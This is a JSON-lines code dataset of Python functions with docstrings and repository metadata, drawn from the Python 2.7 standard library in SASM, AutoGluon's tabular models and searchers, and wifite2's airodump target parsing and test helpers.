{"docstring": "\"\"\"Split the extension from a pathname.\n\nExtension is everything from the last dot to the end, ignoring\nleading dots.  Returns \"(root, ext)\"; ext may be empty.\"\"\"\n\n", "func_signal": "def _splitext(p, sep, altsep, extsep):\n", "code": "sepIndex = p.rfind(sep)\nif altsep:\n    altsepIndex = p.rfind(altsep)\n    sepIndex = max(sepIndex, altsepIndex)\n\ndotIndex = p.rfind(extsep)\nif dotIndex > sepIndex:\n    # skip all leading dots\n    filenameIndex = sepIndex + 1\n    while filenameIndex < dotIndex:\n        if p[filenameIndex] != extsep:\n            return p[:dotIndex], p[dotIndex:]\n        filenameIndex += 1\n\nreturn p, ''", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/genericpath.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Test whether a path is a regular file\"\"\"\n", "func_signal": "def isfile(path):\n", "code": "try:\n    st = os.stat(path)\nexcept os.error:\n    return False\nreturn stat.S_ISREG(st.st_mode)", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/genericpath.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Encode the input, returning a tuple (output object, length consumed).\n\nerrors defines the error handling to apply. It defaults to\n'strict' handling which is the only currently supported\nerror handling for this codec.\n\n\"\"\"\n", "func_signal": "def quopri_encode(input, errors='strict'):\n", "code": "assert errors == 'strict'\n# using str() because of cStringIO's Unicode undesired Unicode behavior.\nf = StringIO(str(input))\ng = StringIO()\nquopri.encode(f, g, 1)\noutput = g.getvalue()\nreturn (output, len(input))", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/encodings/quopri_codec.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Run custom site specific code, if available.\"\"\"\n", "func_signal": "def execsitecustomize():\n", "code": "try:\n    import sitecustomize\nexcept ImportError:\n    pass\nexcept Exception:\n    if sys.flags.verbose:\n        sys.excepthook(*sys.exc_info())\n    else:\n        print >>sys.stderr, \\\n            \"'import sitecustomize' failed; use -v for traceback\"", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Run custom user specific code, if available.\"\"\"\n", "func_signal": "def execusercustomize():\n", "code": "try:\n    import usercustomize\nexcept ImportError:\n    pass\nexcept Exception:\n    if sys.flags.verbose:\n        sys.excepthook(*sys.exc_info())\n    else:\n        print>>sys.stderr, \\\n            \"'import usercustomize' failed; use -v for traceback\"", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "# todo: add support for missing values, which should get encoded as 1.\n", "func_signal": "def enc_cat(self, datetimes):\n", "code": "datetimes = self.clean_data(datetimes)\ndf = pd.DataFrame({'dt': datetimes})\nadd_datepart(df, field_name='dt', prefix='', drop=False)\nfeats = []\nfor c, t in self.cols_types:\n    f = torch.LongTensor(df[c].to_numpy().astype('int32'))\n    if c in ['Month', 'Week', 'Day']:\n        f -= 1\n    feats.append(f)\nfeats = torch.stack(feats, dim=1) + 2  # + 2 for missing and padding\nreturn feats", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_encoder.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nIf we somehow do not get col_info when creating a TT dataset, then set every feature type to CATEGORICAL.\n\"\"\"\n", "func_signal": "def get_col_info(X):\n", "code": "cols = list(X.columns)\ncol_info = []\nfor c in cols:\n    col_info.append({\"name\": c, \"type\": \"CATEGORICAL\"})\nreturn col_info", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/utils.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nPre-processing specific to TabTransformer. Setting up feature encoders, renaming columns with periods in\nthem (torch), and converting X, X_val, X_unlabeled into TabTransformerDataset's.\n\"\"\"\n", "func_signal": "def _preprocess_train(self, X, X_val=None, X_unlabeled=None, fe=None):\n", "code": "from .utils import TabTransformerDataset\n\nX = self._preprocess_nonadaptive(X)\nif X_val is not None:\n    X_val = self._preprocess_nonadaptive(X_val)\nif X_unlabeled is not None:\n    X_unlabeled = self._preprocess_nonadaptive(X_unlabeled)\n\n\nself._period_columns_mapping = self._get_no_period_columns(X.columns)\nX = X.rename(columns=self._period_columns_mapping)\n\nif X_val is not None:\n    X_val = X_val.rename(columns=self._period_columns_mapping)\nif X_unlabeled is not None:\n    X_unlabeled = X_unlabeled.rename(columns=self._period_columns_mapping)\n\nself._types_of_features, _ = self._get_types_of_features(X, needs_extra_types=False)\n\n# Also need to rename the feature names in the types_of_features dictionary.\nfor feature_dict in self._types_of_features:\n    # Need to check that the value is in the mapping. Otherwise, we could be updating columns that have been dropped.\n    feature_dict.update(('name', self._period_columns_mapping[v]) for k, v in feature_dict.items() if k == 'name' and v in self._period_columns_mapping)\n\nencoders = self.params['encoders']\ndata = TabTransformerDataset(X, encoders=encoders, problem_type=self.problem_type, col_info=self._types_of_features)\nself.fe = fe\nif self.fe is not None:\n    if X_unlabeled is None:\n        unlab_data = None\n    elif X_unlabeled is not None:\n        unlab_data = TabTransformerDataset(X_unlabeled, encoders=encoders, problem_type=self.problem_type, col_info=self._types_of_features)\nif self.fe is None:\n    if X_unlabeled is None:\n        data.fit_feat_encoders()\n        self.fe = data.feature_encoders\n        unlab_data = None\n    elif X_unlabeled is not None:\n        unlab_data = TabTransformerDataset(X_unlabeled, encoders=encoders, problem_type=self.problem_type, col_info=self._types_of_features)\n        unlab_data.fit_feat_encoders()\n        self.fe = unlab_data.feature_encoders\n\ndata.encode(self.fe)\n\nif X_val is not None:\n    val_data = TabTransformerDataset(X_val, encoders=encoders, problem_type=self.problem_type, col_info=self._types_of_features)\n    val_data.encode(self.fe)\nelse:\n    val_data = None\n\nif unlab_data is not None:\n    unlab_data.encode(self.fe)\n\nreturn data, val_data, unlab_data", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_model.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "# added arguments inside the inner1,\n# if function takes any arguments,\n# can be added like this.\n", "func_signal": "def calculate_time(func):\n", "code": "def inner1(*args, **kwargs):\n    # storing time before function execution\n    begin = time.time()\n\n    output = func(*args, **kwargs)\n\n    # storing time after function execution\n    end = time.time()\n    logger.debug(\"Total time taken in \" + str(func.__name__)+\": \"+str(end - begin))\n\n    return output\n\nreturn inner1", "path": "autogluon/core/src/autogluon/core/utils/decorators.py", "commit_date": "2020-10-14 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nInternal torch model that uses TabTransformer as an embedding.\nThis is where we are passing through activations and neurons.\n\nParameters\n----------\nnum_class (int): Number of classes identified.\ncat_feat_origin_cards (list): List of categorical features\n\"\"\"\n", "func_signal": "def __init__(self, num_class, feature_dim, num_output_layers, device, params):\n", "code": "super().__init__()\nimport torch.nn as nn\nfrom .tab_transformer import TabTransformer\nself.embed = TabTransformer(**params)\n\nrelu = nn.ReLU()\nin_dim = 2 * feature_dim\nlin = nn.Linear(in_dim, in_dim, bias=True)\nlin_out = nn.Linear(in_dim, num_class, bias=True)\nself.fc = [nn.Sequential(*[relu, lin])] * (num_output_layers - 1) + [nn.Sequential(*[relu, lin_out])]\n\n# Each individual layer inside needs to be put into the GPU.\n# Calling \"self.model.cuda()\" (TabTransformer:get_model()) will not put a python list into GPU.\nif device.type == \"cuda\":\n    for layer in range(num_output_layers):\n        self.fc[layer] = self.fc[layer].cuda()", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_model_base.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\" Training and evaluation function used during a single trial of HPO \"\"\"\n", "func_signal": "def tt_trial(args, reporter):\n", "code": "try:\n    model, args, util_args = model_trial.prepare_inputs(args=args)\n\n    fit_model_args = dict(X_train=util_args.X_train, y_train=util_args.y_train, X_val=util_args.X_val, y_val=util_args.y_val)\n    predict_proba_args = dict(X=util_args.X_val)\n    model = model_trial.fit_and_save_model(model=model, params=args, fit_args=fit_model_args, predict_proba_args=predict_proba_args, y_val=util_args.y_val,\n                                   time_start=util_args.time_start, time_limit=util_args.get('time_limit', None), reporter=reporter)\nexcept Exception as e:\n    if not isinstance(e, TimeLimitExceeded):\n        logger.exception(e, exc_info=True)\n    reporter.terminate()\nelse:\n    reporter(epoch = model.params['epochs'] + 1, validation_performance=model.val_score)\npass", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/utils.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "# TODO: explore/add other hyperparameters like weight decay, use of batch-norm, activation-function choice, etc.\n", "func_signal": "def get_param_multiclass_baseline():\n", "code": "params = {\n    # See docs: https://docs.fast.ai/tabular.models.html\n    'layers': None,  # layers configuration; None - use model's heuristics\n    'emb_drop': 0.1,  # embedding layers dropout\n    'ps': [0.1],  # linear layers dropout\n    'bs': 256,  # batch size\n\n    # maximum learning rate for one cycle policy https://docs.fast.ai/train.html#fit_one_cycle\n    # One-cycle policy paper: https://arxiv.org/abs/1803.09820\n    'lr': 1e-2,\n    'epochs': 30,  # maximum number of epochs\n\n    # Early stopping settings. See more details here: https://docs.fast.ai/callbacks.tracker.html#EarlyStoppingCallback\n    'early.stopping.min_delta': 0.0001,\n    'early.stopping.patience': 20,\n\n    # If > 0, then use LabelSmoothingCrossEntropy loss function for binary/multi-class classification;\n    # otherwise use default loss function for this type of problem\n    'smoothing': 0.0,\n}\nreturn params", "path": "autogluon/tabular/src/autogluon/tabular/models/fastainn/hyperparameters/parameters.py", "commit_date": "2020-11-17 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "# Drop category and object column dtypes, since NaiveBayes can't handle these dtypes.\n", "func_signal": "def _preprocess(self, X, **kwargs):\n", "code": "cat_columns = X.select_dtypes(['category', 'object']).columns\nX = X.drop(cat_columns, axis=1)\n# Add a fillna call to handle missing values.\nreturn super()._preprocess(X, **kwargs).fillna(0)", "path": "autogluon/examples/tabular/example_custom_model_tabular.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nCreates a KNN classifier model based on FAISS. FAISS allows you to compose different\nnear-neighbor search algorithms from several different preprocessing / search algorithms\nThis composition is specified by the string that is passed to the FAISS index_factory. \nHere are good guidelines for choosing the index string: \nhttps://github.com/facebookresearch/faiss/wiki/Guidelines-to-choose-an-index\n\nThe model itself is a clone of the sklearn one\n\"\"\"\n", "func_signal": "def __init__(self, n_neighbors=5, weights='uniform', n_jobs=-1, index_factory_string=\"Flat\"):\n", "code": "try_import_faiss()\nimport faiss\nself.faiss = faiss\nself.index_factory_string = index_factory_string\nself.n_neighbors = n_neighbors\nself.weights = weights\nself.classes = []\nself.n_jobs = n_jobs\nif n_jobs > 0:\n    # global config, affects all faiss indexes\n    faiss.omp_set_num_threads(n_jobs)", "path": "autogluon/tabular/src/autogluon/tabular/models/knn/knn_utils.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nValues that the encoder has never seen before are returned as 1.  0 is reserved for padding.\n\"\"\"\n", "func_signal": "def enc_cat(self, data):\n", "code": "data = self.clean_data(data)\nidxs = [self._item_to_idx.get(item, 1) for item in data]\nreturn torch.LongTensor(idxs).unsqueeze(1)", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_encoder.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"Factory for searcher objects\n\nThis function creates searcher objects from string argument name and\nadditional kwargs. It is typically called in the constructor of a\nscheduler (see FIFOScheduler), which provides most of the required kwargs.\n\nNote: RLSearcher is not supported here, because its **kwargs are different\nfrom other searchers (no 'configspace').\n\nThe 'bayesopt' searchers depend on which scheduler is used (GPFIFOSearcher\nfor FIFOScheduler, GPMultiFidelitySearcher for HyperbandScheduler). They\nhave many additional parameters in kwargs (see docstrings for\nGPFIFOSearcher, GPMultiFidelitySearcher).\n\nParameters\n----------\nname : str\n    Searcher type. Supported are 'random' (RandomSearcher), 'skopt'\n    (SKoptSearcher), 'grid' (GridSearcher), 'bayesopt' (GPFIFOSearcher,\n    GPMultiFidelitySearcher)\nconfigspace : ConfigSpace.ConfigurationSpace\n    Config space of train_fn, equal to train_fn.cs\nscheduler : str\n    Scheduler type the searcher is used in. Supported are 'fifo'\n    (FIFOScheduler), 'hyperband_stopping', 'hyperband_promotion'\n    (HyperbandScheduler: type = 'stopping' or 'promotion')\nreward_attribute : str\n    Name of reward attribute reported by train_fn, equal to\n    reward_attr\nresource_attribute : str [only for HyperbandScheduler]\n    Name of resource (or time) attribute reported by train_fn,\n    equal to time_attr\nmin_epochs : int [only for HyperbandScheduler]\n    Minimum value of resource attribute, equal to grace_period\nmax_epochs : int [only for HyperbandScheduler]\n    Maximum value of resource attribute, equal to max_t\ndebug_log : bool (default: False)\n    Supported by 'random', 'bayesopt'. If True, both searcher and\n    scheduler output an informative log, from which the configs chosen\n    and decisions being made can be traced.\nfirst_is_default : bool (default: True)\n    Supported by 'random', 'skopt', 'bayesopt'. If True, the first config\n    to be evaluated is the default one of the config space. Otherwise, this\n    first config is drawn at random.\nrandom_seed : int\n    Seed for pseudo-random number generator used.\n\nSee Also\n--------\nGPFIFOSearcher\nGPMultiFidelitySearcher\n\"\"\"\n", "func_signal": "def searcher_factory(name, **kwargs):\n", "code": "if name == 'random':\n    return RandomSearcher(**kwargs)\nelif name == 'skopt':\n    _check_supported_scheduler(\n        name, kwargs.get('scheduler'), {'fifo'})\n    return SKoptSearcher(**kwargs)\nelif name == 'grid':\n    return GridSearcher(**kwargs)\nelif name == 'bayesopt':\n    # Gaussian process based Bayesian optimization\n    # The searchers and their kwargs differ depending on the scheduler\n    # type (fifo, hyperband_*)\n    scheduler = _check_supported_scheduler(\n        name, kwargs.get('scheduler'),\n        {'fifo', 'hyperband_stopping', 'hyperband_promotion'})\n    if scheduler == 'fifo':\n        return GPFIFOSearcher(**kwargs)\n    else:\n        return GPMultiFidelitySearcher(**kwargs)\nelse:\n    raise AssertionError(\"name = '{}' not supported\".format(name))", "path": "autogluon/core/src/autogluon/core/searcher/searcher_factory.py", "commit_date": "2020-10-14 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"Check to make sure weights are valid\"\"\"\n", "func_signal": "def _check_weights(weights):\n", "code": "if weights in (None, 'uniform', 'distance'):\n    return weights\nelif callable(weights):\n    return weights\nelse:\n    raise ValueError(\"weights not recognized: should be 'uniform', 'distance', or a callable function\")", "path": "autogluon/tabular/src/autogluon/tabular/models/knn/knn_utils.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nMain training function for TabTransformer\n\"state\" must be one of [None, 'pretrain', 'finetune']\nNone: corresponds to purely supervised learning\npretrain: discriminative task will be a pretext task\nfinetune: same as supervised learning except that the model base has\n          exponentially decaying learning rate.\n\"\"\"\n", "func_signal": "def tt_fit(self, loader_train, loader_val=None, y_val=None, state=None, time_limit=None, reporter=None):\n", "code": "import torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom . import pretexts\n\nstart_time = time.time()\npretext_tasks = pretexts.__dict__\noptimizers = []\nlr = self.params['lr']\nweight_decay = self.params['weight_decay']\nepochs = self.params['pretrain_epochs'] if state == 'pretrain' else self.params['epochs']\nepochs_wo_improve = self.params['epochs_wo_improve']\n\nif state is None:\n    optimizers = [optim.Adam(self.model.parameters(), lr=lr, weight_decay=weight_decay)]\n    pretext = pretext_tasks['SupervisedPretext'](self.problem_type, self.device)\nelif state == 'pretrain':\n    optimizers = [optim.Adam(self.model.parameters(), lr=lr, weight_decay=weight_decay)]\n    pretext = pretext_tasks['BERTPretext'](self.cat_feat_origin_cards, self.device, self.params['hidden_dim'])\nelif state == 'finetune':\n    base_exp_decay = self.params['base_exp_decay']\n    optimizer_fc = [optim.Adam(fc_layer.parameters(), lr=lr, weight_decay=weight_decay) for fc_layer in self.model.fc]\n    optimizer_embeds = optim.Adam(self.model.embed.parameters(), lr=lr, weight_decay=weight_decay)\n    scheduler = optim.lr_scheduler.ExponentialLR(optimizer_embeds, gamma=base_exp_decay) # TODO: Should we be using this in _epoch()?\n    optimizers.extend(optimizer_fc)\n    optimizers.append(optimizer_embeds)\n\n    pretext = pretext_tasks['SupervisedPretext'](self.problem_type, self.device)\n\nelse:\n    raise NotImplementedError(\"state must be one of [None, 'pretrain', 'finetune']\")\n\nif self.problem_type == REGRESSION:\n    loss_criterion = nn.MSELoss()\nelse:\n    loss_criterion = nn.CrossEntropyLoss()\n\nbest_val_metric = -np.inf  # higher = better\nbest_val_epoch = 0\nbest_loss = np.inf\n\nself._verbosity = self.params.get('verbosity', 2)\nif self._verbosity <= 1:\n    verbose_eval = -1\nelif self._verbosity == 2:\n    verbose_eval = 50\nelif self._verbosity == 3:\n    verbose_eval = 10\nelse:\n    verbose_eval = 1\n\nfor e in range(epochs):\n    if e == 0:\n        logger.log(15, \"TabTransformer architecture:\")\n        logger.log(15, str(self.model))\n\n    # Whether or not we want to suppress output based on our verbosity.\n    databar_disable = e % verbose_eval != 0\n    train_loss, val_metric = self._epoch(net=self.model, loader_train=loader_train, loader_val=loader_val, y_val=y_val,\n                                         optimizers=optimizers, loss_criterion=loss_criterion, \\\n                                         pretext=pretext, state=state, scheduler=None, epoch=e, epochs=epochs,\n                                         databar_disable=databar_disable, reporter=reporter, params=self.params)\n\n    # Early stopping for pretrain'ing based on loss.\n    if state == 'pretrain':\n        if train_loss < best_loss or e == 0:\n            if train_loss < best_loss:\n                best_loss = train_loss\n            best_val_epoch = e\n    else:\n        if val_metric >= best_val_metric or e == 0:\n            if loader_val is not None:\n                if not np.isnan(val_metric):\n                    best_val_metric = val_metric\n\n            best_val_epoch = e\n            os.makedirs(os.path.dirname(self.path), exist_ok=True)\n            torch.save(self.model, self.path + self._temp_file_name)\n\n    # If time limit has exceeded or we haven't improved in some number of epochs, stop early.\n    if e - best_val_epoch > epochs_wo_improve:\n        break\n    if time_limit:\n        time_elapsed = time.time() - start_time\n        time_left = time_limit - time_elapsed\n        if time_left <= 0:\n            logger.log(20, \"\\tRan out of time, stopping training early.\")\n            break\n\nif loader_val is not None:\n    try:\n        self.model = torch.load(self.path + self._temp_file_name)\n        os.remove(self.path + self._temp_file_name)\n    except:\n        pass\n    logger.log(15, \"Best model found in epoch %d\" % best_val_epoch)", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_model.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "# Latest pytorch does not support . in module names. Therefore, we must replace the \".\".\n", "func_signal": "def _get_no_period_columns(columns):\n", "code": "rename_columns = dict()\nfor col in columns:\n    new_col_name = col\n    if \".\" in col:\n        new_col_name = col.replace(\".\", \"_\")\n\n    if new_col_name in rename_columns:\n        for i in range(1, 100):\n            append_col_name = new_col_name + \"_\" + str(i)\n            if append_col_name not in rename_columns:\n                new_col_name = append_col_name\n                break\n        else:\n            raise RuntimeError(\"Tried 100 column renames to eliminate duplicates.\\n\"\n                               \"Please check similar columns with . or _ in them.\")\n\n    # Mapping for every column\n    rename_columns[col] = new_col_name\n\nreturn rename_columns", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_model.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"Get the weights from an array of distances and a parameter weights\"\"\"\n", "func_signal": "def _get_weights(dist, weights):\n", "code": "if weights in (None, 'uniform'):\n    return None\nelif weights == 'distance':\n    # if user attempts to classify a point that was zero distance from one\n    # or more training points, those training points are weighted as 1.0\n    # and the other points as 0.0\n    with np.errstate(divide='ignore'):\n        dist = 1. / dist\n    inf_mask = np.isinf(dist)\n    inf_row = np.any(inf_mask, axis=1)\n    dist[inf_row] = inf_mask[inf_row]\n    return dist\nelif callable(weights):\n    return weights(dist)\nelse:\n    raise ValueError(\"weights not recognized: should be 'uniform', 'distance', or a callable function\")", "path": "autogluon/tabular/src/autogluon/tabular/models/knn/knn_utils.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nReturns len(scalars) x 2 tensor, where the second column is a one-hot flag for missing data values\n\"\"\"\n", "func_signal": "def enc_cont(self, scalars):\n", "code": "scalars = self.clean_data(scalars, dtype='float')\nnull_flag = np.full(len(scalars), np.nan, dtype=np.float32)\nvals = np.full(len(scalars), np.nan, dtype=np.float32)\nnull_idxs = np.where(np.array(scalars) == None)[0]\nval_idxs = np.where(np.array(scalars) != None)[0]\n\n# One-hot flag for missing values\nnull_flag[null_idxs] = 1\nnull_flag[val_idxs] = 0\nnull_flag = null_flag.reshape(-1, 1)\n\n# Transform scalar values\nvals[val_idxs] = np.array(scalars, dtype=np.float32)[val_idxs]\nvals = vals.reshape(-1, 1)\nvals = self.scaler.transform(vals) + 1e-7  # Extra 1e-7 to help with correctness testing\nvals[null_idxs] = 0\n\nencoded = np.hstack((vals, null_flag))\nencoded = encoded.clip(-5, 5)  # Guarding against outlier values\nreturn torch.FloatTensor(encoded)", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_encoder.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "# todo: add support for missing values, which should get encoded as 1.\n", "func_signal": "def enc_cat(self, data):\n", "code": "data = LatLongScalarEnc().enc_cont(data)\nfeats = []\nfor col, disc in enumerate(self.discs):\n    d = data[:, col].reshape(-1, 1)\n    d = disc.transform(d).reshape(-1)\n    d = d + 2  # for missing and padding\n    feats.append(d)\nfeats = np.stack(feats, axis=1)\nreturn torch.LongTensor(feats)", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_encoder.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nX (torch.tensor or pd.dataframe): data for model to give prediction probabilities\nreturns: np.array of k-probabilities for each of the k classes. If k=2 we drop the second probability.\n\"\"\"\n", "func_signal": "def _predict_proba(self, X, **kwargs):\n", "code": "import torch\nimport torch.nn as nn\nfrom torch.utils.data import DataLoader\nfrom torch.autograd import Variable\n\nif isinstance(X, pd.DataFrame):\n    # Preprocess here also calls our _preprocess, which creates a TTDataset.\n    X = self.preprocess(X, **kwargs)\n    loader = X.build_loader(self.params['batch_size'], self.params['num_workers'])\nelif isinstance(X, DataLoader):\n    loader = X\nelif isinstance(X, torch.Tensor):\n    X = X.rename(columns=self._get_no_period_columns(X))\n    loader = X.build_loader(self.params['batch_size'], self.params['num_workers'])\nelse:\n    raise NotImplementedError(\n        \"Attempting to predict against a non-supported data type. \\nNeeds to be a pandas DataFrame, torch DataLoader or torch Tensor.\")\n\nself.model.eval()\nsoftmax = nn.Softmax(dim=1)\n\nif self.problem_type == REGRESSION:\n    outputs = torch.zeros([len(loader.dataset), 1])\nelse:\n    outputs = torch.zeros([len(loader.dataset), self.num_classes])\n\niter = 0\nfor data, _ in loader:\n    if self.device.type == \"cuda\":\n        data = data.cuda()\n    with torch.no_grad():\n        data = Variable(data)\n        prob, _ = self.model(data)\n        batch_size = len(prob)\n        if self.problem_type != REGRESSION:\n            prob = softmax(prob)\n\n    outputs[iter:(iter + batch_size)] = prob\n    iter += batch_size\n\nif self.problem_type == BINARY:\n    return outputs[:, 1].cpu().numpy()\nelif self.problem_type == REGRESSION:\n    outputs = outputs.flatten()\n\nreturn outputs.cpu().numpy()", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_model.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nMissing values are returned as category 1.  0 is reserved for padding.\n\"\"\"\n", "func_signal": "def enc_cat(self, data):\n", "code": "data = self.clean_data(data, dtype='float')\ndata = np.array(data).reshape(-1, 1)\nif None in data:\n    idxs = np.full(len(data), -1, dtype=np.int)\n    null_idxs = np.where(data == None)[0]\n    val_idxs = np.where(data != None)[0]\n    if len(val_idxs) > 0:\n        vals = self.disc.transform(data[val_idxs]).reshape(-1)\n        idxs[val_idxs] = vals + 2\n    idxs[null_idxs] = 1\nelse:\n    idxs = self.disc.transform(data).reshape(-1) + 2\nreturn torch.LongTensor(idxs).unsqueeze(1)", "path": "autogluon/tabular/src/autogluon/tabular/models/tab_transformer/tab_transformer_encoder.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "\"\"\"\nCreates a KNN regressor model based on FAISS. FAISS allows you to compose different\nnear-neighbor search algorithms from several different preprocessing / search algorithms\nThis composition is specified by the string that is passed to the FAISS index_factory. \nHere are good guidelines for choosing the index string: \nhttps://github.com/facebookresearch/faiss/wiki/Guidelines-to-choose-an-index\n\nThe model itself is a clone of the sklearn one\n\"\"\"\n", "func_signal": "def __init__(self, n_neighbors=5, weights='uniform', n_jobs=-1, index_factory_string=\"Flat\"):\n", "code": "try_import_faiss()\nimport faiss\nself.faiss = faiss\nself.index_factory_string = index_factory_string\nself.n_neighbors = n_neighbors\nself.weights = weights\nself.n_jobs = n_jobs\nif n_jobs > 0:\n    # global config, affects all faiss indexes\n    faiss.omp_set_num_threads(n_jobs)", "path": "autogluon/tabular/src/autogluon/tabular/models/knn/knn_utils.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "autogluon/autogluon", "stars": 6904, "license": "apache-2.0", "language": "python", "size": 18838}
{"docstring": "''' Parses airodump's CSV file, returns list of Targets '''\n\n# Find the .CSV file\n", "func_signal": "def get_targets(self, old_targets=[], apply_filter=True):\n", "code": "csv_filename = None\nfor fil in self.find_files(endswith='.csv'):\n    csv_filename = fil  # Found the file\n    break\n\nif csv_filename is None or not os.path.exists(csv_filename):\n    return self.targets  # No file found\n\ntargets = Airodump.get_targets_from_csv(csv_filename)\nfor old_target in old_targets:\n    for target in targets:\n        if old_target.bssid == target.bssid:\n            target.wps = old_target.wps\n\n# Check targets for WPS\nif not self.skip_wps:\n    capfile = csv_filename[:-3] + 'cap'\n    try:\n        Tshark.check_for_wps_and_update_targets(capfile, targets)\n    except ValueError:\n        # No tshark, or it failed. Fall-back to wash\n        Wash.check_for_wps_and_update_targets(capfile, targets)\n\nif apply_filter:\n    # Filter targets based on encryption & WPS capability\n    targets = Airodump.filter_targets(targets, skip_wps=self.skip_wps)\n\n# Sort by power\ntargets.sort(key=lambda x: x.power, reverse=True)\n\n# Identify decloaked targets\nfor old_target in self.targets:\n    for new_target in targets:\n        if old_target.bssid != new_target.bssid:\n            continue\n\n        if new_target.essid_known and not old_target.essid_known:\n            # We decloaked a target!\n            new_target.decloaked = True\n            self.decloaked_bssids.add(new_target.bssid)\n\nself.targets = targets\nself.deauth_hidden_targets()\n\nreturn self.targets", "path": "wifite2/wifite/tools/airodump.py", "commit_date": "2018-09-09 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
{"docstring": "''' Helper method to parse targets from filename '''\n", "func_signal": "def getFile(self, filename):\n", "code": "import os, inspect\nthis_file = os.path.abspath(inspect.getsourcefile(self.getFile))\nthis_dir = os.path.dirname(this_file)\nreturn os.path.join(this_dir, 'files', filename)", "path": "wifite2/tests/test_Handshake.py", "commit_date": "2018-06-15 00:00:00", "repo_name": "derv82/wifite2", "stars": 5831, "license": "gpl-2.0", "language": "python", "size": 1104}
